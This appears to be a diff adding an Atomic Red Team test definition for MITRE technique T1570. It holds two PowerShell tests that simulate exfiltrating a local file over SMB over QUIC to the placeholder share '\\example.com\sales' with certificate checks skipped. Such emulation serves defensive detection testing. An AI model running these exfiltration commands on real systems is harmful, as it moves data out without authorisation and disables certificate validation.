@@ -1,0 +1,53 @@
+attack_technique: T1570
+display_name: 'Lateral Tool Transfer'
+atomic_tests:
+- name: Exfiltration Over SMB over QUIC (New-SmbMapping)
+  auto_generated_guid: d8d13303-159e-4f33-89f4-9f07812d016f
+  description: |
+    Simulates an attacker exfiltrating data over SMB over QUIC using the New-SmbMapping command.
+    Prerequisites:
+      - A file server running Windows Server 2022 Datacenter: Azure Edition
+      - A Windows 11 computer
+      - Windows Admin Center
+  supported_platforms:
+    - windows
+  input_arguments:
+    remote_path:
+      description: The UNC path to the share on the file server
+      type: string
+      default: '\\example.com\sales'
+    local_file:
+      description: The local file to be transferred
+      type: path
+      default: 'C:\path\to\file.txt'
+  executor:
+    command: |
+      New-SmbMapping -RemotePath '#{remote_path}' -TransportType QUIC -SkipCertificateCheck
+      copy '#{local_file}' 'Z:\'
+    name: powershell
+    elevation_required: true
+- name: Exfiltration Over SMB over QUIC (NET USE)
+  auto_generated_guid: 183235ca-8e6c-422c-88c2-3aa28c4825d9
+  description: |
+    Simulates an attacker exfiltrating data over SMB over QUIC using the NET USE command.
+    Prerequisites:
+      - A file server running Windows Server 2022 Datacenter: Azure Edition
+      - A Windows 11 computer
+      - Windows Admin Center
+  supported_platforms:
+    - windows
+  input_arguments:
+    remote_path:
+      description: The UNC path to the share on the file server
+      type: string
+      default: '\\example.com\sales'
+    local_file:
+      description: The local file to be transferred
+      type: path
+      default: 'C:\path\to\file.txt'
+  executor:
+    command: |
+      NET USE * '#{remote_path}' /TRANSPORT:QUIC /SKIPCERTCHECK
+      copy '#{local_file}' '*:\'
+    name: powershell
+    elevation_required: true
